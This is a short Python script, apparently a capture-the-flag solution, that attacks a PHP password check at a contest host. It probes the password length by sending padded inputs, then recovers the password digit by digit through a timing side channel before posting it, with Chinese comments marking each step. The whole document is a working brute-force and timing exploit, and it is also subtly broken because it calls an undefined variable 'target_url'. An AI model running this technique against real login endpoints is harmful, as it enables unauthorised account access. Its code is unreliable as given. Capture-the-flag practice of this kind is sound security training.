import re
import time
import requests

url = "http://challenge.wucup.cn:21113/Trapping2147483647.php"
length = 0
password = ""

# 确定密码长度
for length in range(1, 128):
    response = requests.post(url, data={"pass": "a" * length})
    if "Length" not in response.text:
        print(length)
        break

# 爆破密码
for position in range(1, 9):
    for num in range(10):
        start_time = time.time()
        response = requests.post(target_url, data={"pass": password + str(num) + "0" * (length - position - 1)})
        end_time = time.time()
        if (end_time - start_time) > position:
            password += str(num)
            break
    print("Current password: ", password)

# 提交
resp = requests.post(target_url, data={"pass": password})
print(resp.text)